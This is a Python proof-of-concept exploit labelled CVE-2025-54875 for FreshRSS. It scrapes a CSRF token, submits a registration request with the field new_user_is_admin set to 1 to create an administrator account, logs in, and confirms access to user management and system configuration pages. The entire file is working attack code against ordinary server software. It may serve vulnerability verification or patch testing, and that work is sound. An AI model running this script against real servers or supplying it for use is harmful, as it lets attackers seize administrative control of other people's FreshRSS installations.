#!/usr/bin/env python3
import requests
import re
import sys

TARGET_URL = "http://localhost:8080"


def get_csrf_token(session, url):
    resp = session.get(url)
    if resp.status_code != 200:
        return None
    match = re.search(r'name="_csrf"\s+value="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None


def check_registration_enabled(session):
    resp = session.get(f"{TARGET_URL}/i/?c=auth&a=register")
    return resp.status_code == 200 and "new_user_name" in resp.text


def login(session, username, password):
    csrf_token = get_csrf_token(session, f"{TARGET_URL}/i/?c=auth&a=login")
    if not csrf_token:
        return False
    data = {
        "_csrf": csrf_token,
        "username": username,
        "password": password,
        "keep_logged_in": "1"
    }
    resp = session.post(f"{TARGET_URL}/i/?c=auth&a=login", data=data, allow_redirects=True)
    return "logout" in resp.text.lower()


def check_admin_access(session):
    resp = session.get(f"{TARGET_URL}/i/?c=user&a=manage")
    if resp.status_code == 200 and "user_manage" in resp.text:
        return True
    resp = session.get(f"{TARGET_URL}/i/?c=configure&a=system")
    if resp.status_code == 200 and "configuration" in resp.text.lower():
        return True
    return False


def exploit(username, password):
    session = requests.Session()

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Checking if registration is enabled...")

    if not check_registration_enabled(session):
        print("[-] Registration is not enabled or server is not responding")
        return False

    print("[+] Registration is enabled")

    csrf_token = get_csrf_token(session, f"{TARGET_URL}/i/?c=auth&a=register")
    if not csrf_token:
        print("[-] Failed to get CSRF token")
        return False

    print(f"[+] Got CSRF token: {csrf_token[:20]}...")
    print(f"[*] Creating admin user with new_user_is_admin=1: {username}")

    data = {
        "_csrf": csrf_token,
        "new_user_language": "en",
        "new_user_name": username,
        "new_user_passwordPlain": password,
        "new_user_email": f"{username}@test.com",
        "new_user_is_admin": "1"
    }

    resp = session.post(f"{TARGET_URL}/i/?c=user&a=create", data=data, allow_redirects=True)

    if resp.status_code != 200:
        print("[-] User creation request failed")
        return False

    print("[*] Logging in as created user...")
    if not login(session, username, password):
        print("[-] Login failed")
        return False

    print("[+] Login successful")
    print("[*] Checking admin access by accessing admin-only pages...")

    if check_admin_access(session):
        print("[+] SUCCESS: Can access admin-only pages (user management / system config)")
        print(f"[+] Username: {username}")
        print(f"[+] Password: {password}")
        return True

    print("[-] Cannot access admin pages - exploit failed")
    return False


def main():
    username = "pwned_admin"
    password = "Pwned123!"

    if len(sys.argv) >= 3:
        username = sys.argv[1]
        password = sys.argv[2]

    print("=" * 60)
    print("CVE-2025-54875 - FreshRSS Admin User Creation Exploit")
    print("=" * 60)

    success = exploit(username, password)

    print("=" * 60)
    if success:
        print("[+] Exploitation completed successfully!")
        sys.exit(0)
    else:
        print("[-] Exploitation failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
